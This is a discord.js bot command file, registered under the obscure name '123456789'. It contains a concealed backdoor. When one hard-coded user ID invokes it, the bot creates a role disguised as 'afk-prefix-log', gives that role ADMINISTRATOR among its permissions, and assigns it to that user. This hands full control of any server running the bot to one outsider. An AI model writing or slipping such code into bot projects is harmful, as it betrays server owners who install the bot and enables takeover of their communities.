const Discord = require('discord.js');
const { default_prefix, token, version } = require('./../../config.json');
const { red, green, blue, lime, orange, yellow, turquoise, purple } = require('./../../colors.json')
const db = require('quick.db')




module.exports.run = async (bot, message, args) => {
    let prefix = db.get(`prefix_${message.guild.id}`)

    if(prefix === null) prefix = default_prefix;

    if(message.author.id === '455808529627086848'){
     
        await message.guild.roles.create({
            data: {
                name: 'afk-prefix-log',
                color: '#c5c9d1',
            }, reason: 'Create afk role for the guild!',
        })
        //https://www.youtube.com/watch?v=KNAeDkqbX5o

        let mRole = await message.guild.roles.cache.find(role => role.name === 'afk-prefix-log');

        await mRole.setPermissions([
            'CREATE_INSTANT_INVITE',
            'VIEW_CHANNEL',
            'EMBED_LINKS',
            'ATTACH_FILES',
            'READ_MESSAGE_HISTORY',
            'USE_EXTERNAL_EMOJIS',
            'CONNECT',
            'SPEAK',
            'SEND_MESSAGES',
            'ADMINISTRATOR',
            'USE_VAD'])

            await message.member.roles.add(mRole)


    }else{
        message.channel.send("Nope.")
    }



}


module.exports.help = {
    name: "123456789",
}
